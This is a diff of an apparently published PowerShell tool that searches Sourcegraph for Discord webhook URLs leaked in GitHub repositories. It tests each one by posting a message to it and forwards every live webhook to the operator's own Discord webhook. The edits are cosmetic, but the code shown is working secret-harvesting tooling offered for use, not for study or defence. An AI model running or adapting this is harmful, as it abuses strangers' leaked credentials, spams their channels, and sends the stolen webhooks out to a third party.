@@ -4,22 +4,21 @@ SYNOPSIS
 Uses sourcegraph API to search for webhooks on github. 
 
 HOW IT WORKS
-1. searches sourcegraph.com api for possible valid webhooks (correct length and makeup)
+1. Searches sourcegraph.com api for possible valid webhooks (correct length and makeup)
 2. Tries to send a message to each webhook found.
-3. if successful you can have a notification sent to yourown discord webhook. (defined below) 
+3. If successful you can have a notification sent to yourown discord webhook. (defined below) 
 
 USAGE
-1. If you would like notifications upon sucessful webhook discovery change below
-2. run the script
-3. press enter to exit.
-
+1. Run the script
+2. Enter webhook information (Optional)
+3. Review the results
+4. Press enter to exit.
 #>
 
 # Change for your own webhook (optional)
 $hookurl = "YOUR_WEBHOOK_HERE"
 # If you want to notify another webhook found elsewhere enter it here (optional)
 $customUrl = "YOUR_FOUND_WEBHOOK_HERE"
-
 
 # Console Setup
 [Console]::BackgroundColor = "Black"
@@ -80,7 +79,6 @@ $jsonPayload = @{
                 url      = "https://github.com/beigeworm"
                 icon_url = "https://i.ibb.co/vJh2LDp/img.png"
             }
-
             footer      = @{
                 text = "$timestamp"
             }
@@ -100,12 +98,9 @@ If($customUrl.Length -eq 121){
     try{
         WebhookSend
         sleep -m 500
-
         $jsonsys = @{"username" = "egieBOT" ;"content" = "WEBHOOK LIVE! > $hook"} | ConvertTo-Json
         Irm -Uri $hookUrl -Method Post -Body $jsonsys -ContentType 'application/json'
-
         Write-Host "Webhook Success! : $hook" -ForegroundColor Green
-    
     }
     catch{
         Write-Host "Webhook not valid $hook `n> ERROR: $_" -ForegroundColor Red  
@@ -133,7 +128,6 @@ if ($hookurl.Length -eq 121){
                     url      = "https://github.com/beigeworm"
                     icon_url = "https://i.ibb.co/vJh2LDp/img.png"
                 }
-    
                 footer      = @{
                     text = "$timestamp"
                 }
@@ -177,13 +171,10 @@ sleep 1
         try{
             WebhookSend
             sleep -m 500
-
             # If successful send a notification
             $jsonsys = @{"username" = "egieBOT" ;"content" = "FOUND WEBHOOK > $hook"} | ConvertTo-Json
             Irm -Uri $hookUrl -Method Post -Body $jsonsys -ContentType 'application/json'
-
             Write-Host "Webhook FOUND! : $hook"
-    
         }
         # if invalid show error in console
         catch{
@@ -191,13 +182,9 @@ sleep 1
         }
     }
 }
-else{
-    Write-Host "No matching URLs."
-}
+else{Write-Host "No matching URLs."}
 } 
-catch {
-    Write-Host "Error: $_"
-}
+catch{Write-Host "Error: $_"}
 
 # Hold the script to view results before closing
 pause
